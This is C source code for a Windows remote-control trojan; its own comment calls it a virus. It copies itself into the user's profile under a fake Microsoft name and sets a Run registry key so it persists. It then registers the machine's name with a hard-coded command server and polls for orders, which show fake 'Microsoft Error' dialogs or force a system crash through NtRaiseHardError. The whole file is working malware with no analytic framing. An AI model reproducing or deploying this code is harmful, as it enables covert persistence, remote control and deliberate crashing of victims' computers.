#include <stdlib.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <UserEnv.h>
#include <winerror.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Advapi32.lib")

enum SERVER_COMMAND {
    CMD_MSG = 0,
    CMD_CRASH = 1,
    CMD_PING = 2,
    CMD_LIST_USERS = 99,
    CMD_QUERY_PENDING_CMD = 100,
    CMD_REGISTER_USER = 101,
};

#define HOST "000webhostapp.com"

UINT64 UserId = 0;


void ShowMsg(char* Title, char* Msg) {
    MessageBoxA(NULL, Msg, Title, MB_OK);
}

char req[2048] = {0};
char response[0x20002] = {0};
char* uagent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
void TcpInit() {
    WSADATA WsaData;
    int res = WSAStartup(MAKEWORD(2, 2), &WsaData);
    if(res != 0) exit(-1);
}



void ServerRequest(int Cmd, char* arg0, char* arg1, char** Buffer) {
    *Buffer = NULL;
    memset(response, 0, 0x20000);
    SOCKET Socket;
    PADDRINFOA addr;

    int res = getaddrinfo("145.14.145.86", "80", 0, &addr);
    if(res != 0) return; // probably there is no internet connection so keep pinging

    Socket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
    if(Socket == INVALID_SOCKET) return; // probably there is no internet connection so keep pinging


    sprintf_s(req, 2048, "POST /?cmd=%u&uid=%lld&arg0=%s&arg1=%s HTTP/1.1\nUser-Agent: %s\nconnection: close\ncontent-length:0\nhost: molakimtaypointi.000webhostapp.com\naccept:*/*\n\n", Cmd, UserId, arg0, arg1, uagent);
    
    res = connect(Socket, addr->ai_addr, addr->ai_addrlen);
    if(res != 0) return; // probably there is no internet connection so keep pinging
    send(Socket, req, strlen(req), 0);
    int length;
    recv(Socket, response, 0x20000, 0);
    closesocket(Socket);
    char* b = response;
    for(;;) {
        if(memcmp(b, "\r\n\r\n", 4) == 0) {
            b+=7;
            break;
        }else b++;
    }
    *Buffer = b;
}

char  ComputerName[121] = {0};
// returns RequestedCmd (-1 if no cmd is pending)
int QueryPendingCmd(char** _arg0, char** _arg1) {

    char* buff;
    for(;;) {
        // Ping until the response
        ServerRequest(CMD_QUERY_PENDING_CMD, "", "", &buff);
        if(buff) break;
    }
    UINT64 Cmd = _strtoui64(buff, NULL, 10);
    if(Cmd == 200) {
        printf("No pending...\n");
        return -1;
    } else if(Cmd == 401 || Cmd == 500) {
        printf("Server error...\n");
        return -1;
    }
// CMD Format : cmd\narg0\narg1
    char* arg0, *arg1;

    while(*buff++) {
        if(*buff == '\n') {
            arg0 = buff + 1;
            break;
        }
    }
    
    while(*buff++) {
        if(*buff == '\n') {
            *buff = 0;
            buff++;
            arg1 = buff;
            break;
        }
    }
    //arg1 end
    while(*buff++) {
        if(*buff == '\r') {
            *buff = 0;
            break;
        }
    }
    *_arg0 = arg0;
    *_arg1 = arg1;
    printf("Cmd : %llu , arg0 : %s , arg1 : %s\n", Cmd, arg0, arg1);
    
    return Cmd;
}

extern NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
// int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPWSTR lpCmdLine, int nCmdShow) {
int main(int argc, char** argv) {
    
    TcpInit();
    DWORD MaxChars = 120;
    GetComputerNameA(ComputerName, &MaxChars);
    printf("Computer name : %s\n", ComputerName);
    char* path = argv[0];
    // check if path doesn't end with .exe
    if(memcmp(path + strlen(path) - 4, ".exe", 4) != 0) {
        strcat(path, ".exe");
    }
    printf("path : %s\n", path);
    // Install the virus
    HANDLE CurrentFile, TargetFile;
    // char* TargetPath = "%%HOMEDRIVE%%\%%HOMEPATH%%/Microsoft NT Plug.exe";
    CurrentFile = CreateFileA(path, FILE_READ_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if(CurrentFile == INVALID_HANDLE_VALUE) {
        printf("failed to open current file.\n");
        while(1);
        return -1;
    }
    char* TargetPath;
    DWORD sz = 0;
    HANDLE Token;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &Token)) {
        printf("TOKEN_QUERY Not granted\n");
        while(1);
        return -1;
    };
    GetUserProfileDirectoryA(Token, NULL, &sz);
    sz+=0x10;
    TargetPath = malloc(sz);
    if(!GetUserProfileDirectoryA(Token, TargetPath, &sz)) {
        printf("upf");
        while(1);
        return -1;
    }

    printf("SZ : %d, User path : %s\n", sz, TargetPath);

    strcat(TargetPath, "\\Microsoft NT Plug Beta.exe");
    TargetFile = CreateFileA(TargetPath, FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    BOOL ContinueInstall = TRUE;
    if(TargetFile == INVALID_HANDLE_VALUE) {
        if(GetLastError() == ERROR_SHARING_VIOLATION) {
            ContinueInstall = FALSE;
            printf("Sharing violation\n");
        } else {
            printf("failed to open target file : %d\n", GetLastError());
            return -1;
        }
    }

    if(ContinueInstall) {
        UINT ProgSize = GetFileSize(CurrentFile, NULL);
        void* ProgBuffer = malloc(ProgSize);
        ReadFile(CurrentFile, ProgBuffer, ProgSize, NULL, NULL);
        WriteFile(TargetFile, ProgBuffer, ProgSize, NULL, NULL);
        CloseHandle(TargetFile);


    }

        // Register as startup program
        HKEY hkey = NULL;
        RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
        RegSetValueExA(hkey, "Microsoft NT Plug Beta", 0, REG_SZ , TargetPath, strlen(TargetPath));

    // Start the server connection
    char* buff;
    for(;;) {
        ServerRequest(CMD_REGISTER_USER, ComputerName, "", &buff);
        if(buff) break;
        Sleep(3000);
    }

    UserId = _strtoui64(buff, NULL, 10);
    printf("User Id : %llu\n", UserId);
    char* arg0, *arg1;

    for(;;) {
        int Cmd = QueryPendingCmd(&arg0, &arg1);
        switch(Cmd) {
            case CMD_MSG:{
                if(strlen(arg0) < 3) arg0 = "Microsoft Error";
                if(strlen(arg1) < 3) arg1 = "A Pending Operation has been canceled.";

                MessageBoxA(NULL, arg1, arg0, MB_OK);
                break;
            }
            case CMD_CRASH: {
                BOOLEAN bl;
                ULONG Response;
                RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
                break;
            }
            default: break;
        }
        Sleep(1000);
    }
    return 0;
}